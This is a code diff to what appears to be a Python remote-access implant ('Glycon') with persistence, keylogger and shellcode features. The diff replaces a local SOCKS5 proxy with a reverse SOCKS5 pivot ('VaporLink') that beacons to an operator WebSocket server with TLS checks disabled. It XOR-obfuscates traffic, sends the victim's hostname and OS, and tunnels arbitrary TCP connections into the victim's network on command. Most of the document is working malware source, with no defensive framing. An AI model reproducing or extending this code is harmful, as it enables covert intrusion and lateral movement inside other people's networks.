@@ -2204,98 +2204,244 @@ class Persistence:
 
 
 # ======================
-# SOCKS5 Proxy
+# SOCKS5 Proxy (VaporLink Reverse SOCKS5 Pivot Engine)
 # ======================
 class SOCKS5Proxy:
     def __init__(self, port):
         self.port = port
         self.running = False
-        self.server_socket = None
-        self.connections = {{}}
+        self.stop_event = None
+        self.thread = None
 
-    def start(self):
-        if self.running:
-            return {{"status": "error", "message": "Proxy already running"}}
-        
+    def start(self, ws_url="", xor_key="", token="", insecure=True, agent_id=""):
         try:
-            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-            self.server_socket.bind(('127.0.0.1', self.port))
-            self.server_socket.listen(5)
+            import asyncio, struct, ssl, urllib.parse
+            ev_old = getattr(sys, '_glycon_vl_stop', None)
+            if ev_old is not None:
+                try:
+                    ev_old.set()
+                except Exception:
+                    pass
+            stop_ev = threading.Event()
+            sys._glycon_vl_stop = stop_ev
+            self.stop_event = stop_ev
             self.running = True
-            
-            threading.Thread(target=self._accept_connections, daemon=True).start()
-            return {{"status": "success", "message": f"SOCKS5 proxy started on port {{self.port}}"}}
+
+            k_bytes = xor_key.encode() if isinstance(xor_key, str) else (xor_key or b"DefaultKey123456")
+
+            def _xor(d, k=k_bytes):
+                if not d:
+                    return b""
+                n = len(d)
+                fk = (k * ((n // len(k)) + 1))[:n]
+                return (int.from_bytes(d, "big") ^ int.from_bytes(fk, "big")).to_bytes(n, "big")
+
+            def _frame(p, op=2):
+                n = len(p)
+                m = os.urandom(4)
+                o = bytearray([0x80 | op])
+                if n < 126:
+                    o.append(0x80 | n)
+                elif n < 65536:
+                    o.append(0x80 | 126)
+                    o.extend(struct.pack(">H", n))
+                else:
+                    o.append(0x80 | 127)
+                    o.extend(struct.pack(">Q", n))
+                o.extend(m)
+                if n:
+                    o.extend(_xor(p, m))
+                return bytes(o)
+
+            async def _read_msg(r, w, wl):
+                fg = []
+                while True:
+                    h = await r.readexactly(2)
+                    fin, op, m, ln = h[0] & 128, h[0] & 15, h[1] & 128, h[1] & 127
+                    if ln == 126:
+                        ln, = struct.unpack(">H", await r.readexactly(2))
+                    elif ln == 127:
+                        ln, = struct.unpack(">Q", await r.readexactly(8))
+                    mk = await r.readexactly(4) if m else None
+                    p = await r.readexactly(ln) if ln else b""
+                    if m and p:
+                        p = _xor(p, mk)
+                    if op == 8:
+                        return None
+                    if op == 9:
+                        async with wl:
+                            w.write(_frame(p, 10))
+                            await w.drain()
+                        continue
+                    if op == 10:
+                        continue
+                    if op in (1, 2):
+                        fg = [p]
+                        if fin:
+                            return b"".join(fg)
+                    elif op == 0:
+                        fg.append(p)
+                        if fin:
+                            return b"".join(fg)
+
+            async def _run_tunnel(u):
+                if "://" not in u:
+                    u = "wss://" + u
+                p = urllib.parse.urlparse(u)
+                sc = p.scheme in ("wss", "https")
+                h = p.hostname
+                pt = p.port or (443 if sc else 80)
+                pa = p.path or "/"
+                if p.query:
+                    pa += "?" + p.query
+                hh = h if pt in (80, 443) else f"{{h}}:{{pt}}"
+                ctx = (ssl._create_unverified_context() if insecure else ssl.create_default_context()) if sc else None
+                hn = socket.gethostname()
+                osn = f"{{platform.system()}} {{platform.release()}}"
+                while not stop_ev.is_set():
+                    st = {{}}
+                    wl = asyncio.Lock()
+                    try:
+                        r, w = await asyncio.wait_for(asyncio.open_connection(h, pt, ssl=ctx, server_hostname=h if sc else None), 10)
+                        ky = base64.b64encode(os.urandom(16)).decode()
+                        w.write(
+                            f"GET {{pa}} HTTP/1.1\r\nHost: {{hh}}\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n"
+                            f"Sec-WebSocket-Key: {{ky}}\r\nSec-WebSocket-Version: 13\r\nX-Vapor-Token: {{token}}\r\n"
+                            f"X-Vapor-Host: {{hn}}\r\nX-Vapor-OS: {{osn}}\r\nX-Vapor-Agent: {{agent_id}}\r\n"
+                            f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n\r\n".encode()
+                        )
+                        await w.drain()
+                        res = await asyncio.wait_for(r.readuntil(b"\r\n\r\n"), 10)
+                        if b" 101 " not in res.split(b"\r\n", 1)[0]:
+                            w.close()
+                            await asyncio.sleep(8)
+                            continue
+
+                        async def tx(sid, c, d=b""):
+                            try:
+                                async with wl:
+                                    w.write(_frame(_xor(struct.pack(">IB", sid, c) + d)))
+                                    await w.drain()
+                            except Exception:
+                                pass
+
+                        async def pipe(sid, sr, sw):
+                            try:
+                                while True:
+                                    d = await sr.read(32768)
+                                    if not d:
+                                        break
+                                    await tx(sid, 4, d)
+                            except Exception:
+                                pass
+                            finally:
+                                st.pop(sid, None)
+                                sw.close()
+                                await tx(sid, 5)
+
+                        async def conn(sid, pl):
+                            try:
+                                tpt, = struct.unpack(">H", pl[:2])
+                                th = pl[2:].decode("utf-8", "ignore")
+                                sr, sw = await asyncio.wait_for(asyncio.open_connection(th, tpt), 6)
+                                st[sid] = sw
+                                await tx(sid, 2)
+                                asyncio.create_task(pipe(sid, sr, sw))
+                            except Exception:
+                                await tx(sid, 3)
+
+                        while not stop_ev.is_set():
+                            try:
+                                m = await asyncio.wait_for(_read_msg(r, w, wl), 2.0)
+                            except asyncio.TimeoutError:
+                                continue
+                            if m is None:
+                                break
+                            m = _xor(m)
+                            if len(m) < 5:
+                                continue
+                            sid, c = struct.unpack(">IB", m[:5])
+                            pl = m[5:]
+                            if c == 1:
+                                asyncio.create_task(conn(sid, pl))
+                            elif c == 4 and sid in st:
+                                try:
+                                    st[sid].write(pl)
+                                    await st[sid].drain()
+                                except Exception:
+                                    sw = st.pop(sid, None)
+                                    if sw:
+                                        sw.close()
+                            elif c == 5 and sid in st:
+                                sw = st.pop(sid, None)
+                                if sw:
+                                    sw.close()
+                            elif c == 255:
+                                for sw in list(st.values()):
+                                    try:
+                                        sw.close()
+                                    except Exception:
+                                        pass
+                                stop_ev.set()
+                                break
+                    except Exception:
+                        pass
+                    finally:
+                        for sw in list(st.values()):
+                            try:
+                                sw.close()
+                            except Exception:
+                                pass
+                        st.clear()
+                    if stop_ev.is_set():
+                        break
+                    await asyncio.sleep(8)
+
+            def _worker():
+                loop = asyncio.new_event_loop()
+                asyncio.set_event_loop(loop)
+                try:
+                    loop.run_until_complete(_run_tunnel(ws_url))
+                except Exception:
+                    pass
+                finally:
+                    try:
+                        loop.close()
+                    except Exception:
+                        pass
+
+            self.thread = threading.Thread(target=_worker, name="GlyconVaporLinkPivot", daemon=True)
+            self.thread.start()
+            sys._glycon_vl_thread = self.thread
+            return {{"status": "success", "message": f"VaporLink reverse SOCKS5 pivot connected to {{ws_url}}"}}
         except Exception as e:
             return {{"status": "error", "message": str(e)}}
 
     def stop(self):
         self.running = False
-        if self.server_socket:
-            self.server_socket.close()
-        return {{"status": "success", "message": "SOCKS5 proxy stopped"}}
-
-    def _accept_connections(self):
-        while self.running:
+        proc = getattr(sys, '_glycon_vl_proc', None)
+        pid = getattr(sys, '_glycon_vl_pid', None)
+        if proc is not None:
             try:
-                conn, addr = self.server_socket.accept()
-                threading.Thread(
-                    target=self._handle_client,
-                    args=(conn, addr),
-                    daemon=True
-                ).start()
-            except:
-                break
-
-    def _handle_client(self, conn, addr):
-        try:
-            conn.recv(256)
-            conn.sendall(b"\x05\x00")
-            
-            request = conn.recv(4)
-            if request[0] != 0x05 or request[1] != 0x01:
-                conn.close()
-                return
-            
-            addr_type = request[3]
-            if addr_type == 0x01:
-                target_host = socket.inet_ntoa(conn.recv(4))
-            elif addr_type == 0x03:
-                length = ord(conn.recv(1))
-                target_host = conn.recv(length).decode()
-            else:
-                conn.close()
-                return
-            
-            target_port = int.from_bytes(conn.recv(2), 'big')
-            
-            target_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            target_sock.connect((target_host, target_port))
-            
-            conn.sendall(b"\x05\x00\x00\x01" + socket.inet_aton("0.0.0.0") + (self.port).to_bytes(2, 'big'))
-            
-            self._relay_data(conn, target_sock)
-        except Exception as e:
-            pass
-        finally:
-            conn.close()
-
-    def _relay_data(self, client_sock, target_sock):
-        sockets = [client_sock, target_sock]
-        while self.running:
+                proc.kill()
+            except Exception:
+                pass
+        if pid and os.name == 'nt':
             try:
-                read_sockets, _, _ = select.select(sockets, [], [], 1)
-                for sock in read_sockets:
-                    data = sock.recv(4096)
-                    if not data:
-                        return
-                    
-                    if sock == client_sock:
-                        target_sock.sendall(data)
-                    else:
-                        client_sock.sendall(data)
-            except:
-                break
+                subprocess.run(['taskkill', '/F', '/PID', str(pid)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=0x08000000)
+            except Exception:
+                pass
+        sys._glycon_vl_proc = None
+        sys._glycon_vl_pid = None
+        ev = getattr(sys, '_glycon_vl_stop', None) or self.stop_event
+        if ev:
+            try:
+                ev.set()
+            except Exception:
+                pass
+        sys._glycon_vl_stop = None
+        sys._glycon_vl_thread = None
+        return {{"status": "success", "message": "VaporLink reverse SOCKS5 proxy stopped"}}
 
 # ======================
 # Keylogger
@@ -3981,8 +4127,16 @@ class Agent:
                     base64.b64decode(task.get("shellcode", "")))
             
             elif task_type == "socks5":
-                if task.get("action") == "start":
-                    return self.socks_proxy.start()
+                t_data = task.get("data", {{}}) if isinstance(task.get("data"), dict) else {{}}
+                action = task.get("action") or t_data.get("action", "start")
+                if action == "start":
+                    return self.socks_proxy.start(
+                        ws_url=task.get("ws_url") or t_data.get("ws_url", ""),
+                        xor_key=task.get("xor_key") or t_data.get("xor_key", ""),
+                        token=task.get("token") or t_data.get("token", ""),
+                        insecure=task.get("insecure", True),
+                        agent_id=self.agent_id
+                    )
                 else:
                     return self.socks_proxy.stop()
             
